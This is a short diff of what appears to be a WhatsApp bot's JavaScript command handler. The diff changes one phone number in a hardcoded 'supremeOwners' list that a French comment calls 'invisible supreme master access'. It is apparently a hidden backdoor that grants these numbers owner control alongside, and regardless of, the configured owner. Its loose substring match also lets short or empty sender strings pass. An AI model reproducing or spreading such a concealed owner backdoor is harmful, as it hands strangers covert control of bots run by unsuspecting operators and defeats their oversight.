@@ -41,7 +41,7 @@ module.exports = {
       const senderNumber = senderJid.replace(/\D/g, '');
 
       // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE (Double emprise)
-      const supremeOwners = ['22651622652', '22665107481'];
+      const supremeOwners = ['22651622652', '22665108174'];
       const isSupremeOwner = supremeOwners.some(num => senderNumber.includes(num) || num.includes(senderNumber));
 
       const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
